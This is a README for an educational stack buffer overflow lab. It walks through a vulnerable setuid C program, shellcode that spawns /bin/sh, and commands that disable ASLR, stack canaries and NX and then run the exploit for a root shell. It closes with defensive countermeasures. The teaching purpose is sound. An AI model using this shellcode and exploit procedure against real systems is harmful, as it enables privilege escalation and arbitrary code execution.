# Buffer Overflow Attack Lab

A comprehensive demonstration of classic buffer overflow vulnerabilities and exploitation techniques. This lab explores how improper bounds checking in C programs can lead to arbitrary code execution and privilege escalation through stack-based buffer overflows.

## Video Walkthrough

[![Buffer Overflow Attack Lab Walkthrough](https://img.youtube.com/vi/0MjT1W4ZjyQ/maxresdefault.jpg)](https://www.youtube.com/watch?v=0MjT1W4ZjyQ)

*Click the image above to watch a complete walkthrough of this lab*

## Overview

This repository contains a vulnerable C program and exploitation tools that demonstrate classic stack-based buffer overflow attacks. The lab covers the fundamental concepts of memory corruption vulnerabilities, shellcode injection, and the various security mechanisms that protect against such attacks in modern systems.

## Files Included

### stack.c - Vulnerable Program
A simple C program containing a critical buffer overflow vulnerability:
- **bof() function**: Contains a 240-byte buffer with unsafe `strcpy()` operation
- **main() function**: Reads 517 bytes from `badfile` and passes to vulnerable function
- **Vulnerability**: No bounds checking allows buffer overflow and return address overwrite

### exploit.py - Exploitation Script
Python script that generates the malicious payload:
- **Shellcode**: Assembly instructions to spawn `/bin/sh` shell
- **NOP Sled**: 517 bytes of no-operation instructions for reliable exploitation
- **Address Calculation**: Overwrites return address to redirect execution flow
- **Payload Generation**: Creates `badfile` with crafted exploit content

### Commands.txt - Setup Instructions
Complete list of commands needed for lab setup and execution

### badfile - Malicious Payload
Binary file containing the crafted exploit payload with shellcode

## Vulnerability Analysis

### The Buffer Overflow
The vulnerability exists in the `bof()` function:
```c
char buffer[BUF_SIZE];  // 240 bytes
strcpy(buffer, str);    // No bounds checking - VULNERABLE
```

**Attack Vector**: The `strcpy()` function copies data without checking buffer boundaries, allowing an attacker to:
1. Overflow the 240-byte buffer
2. Overwrite the saved frame pointer (EBP)
3. Overwrite the return address
4. Redirect program execution to injected shellcode

### Memory Layout Exploitation
```
[buffer 240 bytes][saved EBP][return address][local variables]
                      ↑           ↑
                   Target 1    Target 2 (main target)
```

## Security Mechanisms and Bypasses

### 1. Address Space Layout Randomization (ASLR)
**Protection**: Randomizes memory addresses to prevent predictable exploitation
**Bypass**: Disable with `sudo sysctl -w kernel.randomize_va_space=0`

### 2. Stack Canaries (Stack Guard)
**Protection**: Places known values before return addresses to detect corruption
**Bypass**: Compile with `-fno-stack-protector` flag

### 3. Non-Executable Stack (NX Bit)
**Protection**: Marks stack memory as non-executable
**Bypass**: Compile with `-z execstack` flag

### 4. Shell Countermeasures
**Protection**: `/bin/sh` drops privileges in setuid contexts
**Bypass**: Redirect to `/bin/zsh` with `sudo ln -sf /bin/zsh /bin/sh`

## Lab Setup and Execution

### Prerequisites
- Linux system (Ubuntu 16.04+ recommended)
- GCC compiler with debugging support
- GDB debugger
- Python 3
- Root/sudo access

### Step 1: Disable Security Mechanisms
```bash
# Disable ASLR
sudo sysctl -w kernel.randomize_va_space=0

# Change shell to bypass setuid protections
sudo ln -sf /bin/zsh /bin/sh
```

### Step 2: Compile Vulnerable Program
```bash
# Compile with security features disabled
gcc -DBUF_SIZE=240 -o stack -z execstack -fno-stack-protector stack.c

# Set setuid root permissions
sudo chown root stack
sudo chmod 4755 stack

# Compile debug version for address discovery
gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c
```

### Step 3: Address Discovery with GDB
```bash
# Create initial badfile
touch badfile

# Launch GDB
gdb stack_dbg

# Set breakpoint and run
(gdb) b bof
(gdb) run

# Get memory addresses
(gdb) x &buffer    # Buffer address
(gdb) x $ebp       # Extended Base Pointer address
(gdb) quit
```

### Step 4: Configure Exploit
Edit `exploit.py` with discovered addresses:
```python
buff   = 0xbfffe950  # Replace with buffer address from GDB
ebp    = 0xbfffea48  # Replace with EBP address from GDB
```

### Step 5: Execute Attack
```bash
# Generate malicious payload
rm badfile
python3 exploit.py

# Execute vulnerable program
./stack
```

## Shellcode Analysis

The injected shellcode performs the following operations:
```assembly
xorl    %eax,%eax     # Clear EAX register
pushl   %eax          # Push null terminator
pushl   $0x68732f2f   # Push "//sh"
pushl   $0x6e69622f   # Push "/bin"
movl    %esp,%ebx     # Move stack pointer to EBX ("/bin//sh")
pushl   %eax          # Push null (argv[1])
pushl   %ebx          # Push program name (argv[0])
movl    %esp,%ecx     # Move stack pointer to ECX (argv)
cdq                   # Clear EDX (envp)
movb    $0x0b,%al     # System call number for execve
int     $0x80         # Execute system call
```

**Result**: Spawns a root shell due to setuid privileges

## Key Learning Objectives

### Attack Concepts
- **Stack-based Buffer Overflows**: Understanding memory corruption vulnerabilities
- **Return Address Overwrite**: Redirecting program execution flow
- **Shellcode Injection**: Injecting and executing arbitrary code
- **NOP Sleds**: Improving exploit reliability
- **Privilege Escalation**: Exploiting setuid programs for elevated access

### Defense Mechanisms
- **Modern Compiler Protections**: Stack canaries, FORTIFY_SOURCE
- **Operating System Features**: ASLR, NX bit, SMEP/SMAP
- **Secure Coding Practices**: Bounds checking, safe string functions
- **Runtime Protection**: Control Flow Integrity (CFI), Intel CET

## Advanced Techniques Demonstrated

### Exploit Development Process
1. **Vulnerability Discovery**: Identifying unsafe functions
2. **Memory Layout Analysis**: Understanding stack organization
3. **Address Space Reconnaissance**: Using debuggers for memory mapping
4. **Payload Crafting**: Constructing reliable exploits
5. **Privilege Escalation**: Leveraging setuid mechanisms

### Reliability Improvements
- **NOP Sleds**: Compensating for address imprecision
- **Return Address Calculation**: Mathematical approach to stack manipulation
- **Shellcode Positioning**: Strategic payload placement

## Defensive Countermeasures

### Code-Level Protections
```c
// Vulnerable
strcpy(buffer, input);

// Secure alternatives
strncpy(buffer, input, sizeof(buffer)-1);
strlcpy(buffer, input, sizeof(buffer));
snprintf(buffer, sizeof(buffer), "%s", input);
```

### Compilation Security
```bash
# Enable all security features
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE program.c
```

### System-Level Hardening
- Enable ASLR: `sysctl -w kernel.randomize_va_space=2`
- Use modern shells with setuid protections
- Implement mandatory access controls (SELinux, AppArmor)
- Regular security updates and compiler upgrades
